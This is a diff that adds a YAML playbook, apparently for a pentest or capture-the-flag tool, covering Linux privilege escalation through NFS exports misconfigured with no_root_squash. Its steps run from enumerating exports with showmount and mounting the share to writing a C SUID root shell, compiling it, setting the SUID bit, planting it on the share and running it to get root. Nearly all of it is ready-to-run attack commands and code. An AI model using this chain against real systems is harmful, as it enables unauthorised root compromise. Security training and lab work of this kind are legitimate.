@@ -1,0 +1,185 @@
+name: Linux Privilege Escalation - NFS
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE NFS EXPORTS
+# =========================================================
+- title: Enumerate NFS Exports
+  mode: enum
+  info: |
+    Identify NFS shares and look for dangerous export options.
+
+  entries:
+
+    - cmd: "showmount -e {target}"
+      info: enumerate exported NFS shares
+
+      look_for:
+        - "rw exports"
+        - "no_root_squash"
+        - "writable shares"
+        - "home directories"
+        - "/tmp or backup shares"
+
+    - cmd: "cat /etc/exports"
+      info: local export configuration
+
+      look_for:
+        - "no_root_squash"
+        - "insecure"
+        - "rw"
+
+    - cmd: "mount | grep nfs"
+      info: identify mounted NFS shares
+
+  notes:
+    - no_root_squash is the key misconfiguration
+    - root user on client remains root on server
+    - usually leads directly to root compromise
+
+# =========================================================
+# [2] MOUNT THE SHARE
+# =========================================================
+- title: Mount Writable Share
+  mode: chain
+  info: |
+    Mount the exported NFS share locally.
+
+  entries:
+
+    - cmd: "mkdir /tmp/nfs"
+      info: create local mount directory
+
+    - cmd: "mount -t nfs {target}:/share /tmp/nfs"
+      info: mount exported share
+
+    - cmd: "ls -la /tmp/nfs"
+      info: verify writable access
+
+      look_for:
+        - "write permissions"
+        - "owned files"
+        - "root-owned directories"
+
+  notes:
+    - replace /share with discovered export path
+    - mounting as root is usually required
+
+# =========================================================
+# [3] SUID SHELL SOURCE
+# =========================================================
+- title: SUID Shell Source
+  mode: script
+  info: |
+    Minimal SUID root shell source code.
+
+  script: |
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    #include <stdlib.h>
+
+    int main(void)
+    {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash");
+        return 0;
+    }
+
+  notes:
+    - save as shell.c
+    - compile locally before uploading
+    - used when no_root_squash is enabled
+
+# =========================================================
+# [4] COMPILE SUID SHELL
+# =========================================================
+- title: Compile SUID Shell
+  mode: chain
+  info: |
+    Compile the shell locally as root.
+
+  entries:
+
+    - cmd: "gcc shell.c -o shell"
+      info: compile binary
+
+    - cmd: "chmod +s shell"
+      info: add SUID bit
+
+    - cmd: "ls -l shell"
+      info: verify SUID permissions
+
+      look_for:
+        - "-rwsr-xr-x"
+        - "owned by root"
+
+  notes:
+    - compile on attacker machine
+    - binary must be owned by root
+
+# =========================================================
+# [5] COPY TO NFS SHARE
+# =========================================================
+- title: Upload SUID Binary
+  mode: chain
+  info: |
+    Copy the SUID shell into the mounted NFS share.
+
+  entries:
+
+    - cmd: "cp shell /tmp/nfs/"
+      info: copy binary to NFS export
+
+    - cmd: "ls -l /tmp/nfs/shell"
+      info: verify permissions persisted
+
+      look_for:
+        - "SUID bit preserved"
+        - "root ownership"
+
+  notes:
+    - if permissions persist, exploitation is successful
+    - no_root_squash allows root-owned files
+
+# =========================================================
+# [6] EXECUTE SHELL ON TARGET
+# =========================================================
+- title: Execute SUID Shell
+  mode: chain
+  info: |
+    Execute the uploaded SUID binary on the target.
+
+  entries:
+
+    - cmd: "/path/to/share/shell"
+      info: execute SUID shell
+
+    - cmd: "id"
+      info: verify root access
+
+      look_for:
+        - "uid=0(root)"
+
+  notes:
+    - path depends on where share is mounted on target
+    - common result is instant root shell
+
+# =========================================================
+# [7] QUICK ENUMERATION
+# =========================================================
+- title: Quick NFS Enumeration
+  mode: standard
+
+  commands:
+    - "showmount -e {target}"
+    - "cat /etc/exports"
+    - "mount -t nfs {target}:/share /tmp/nfs"
+    - "find / -name exports 2>/dev/null"
+
+  notes:
+    - focus on no_root_squash
+    - writable exports are high priority
+    - extremely common in easy Linux boxes
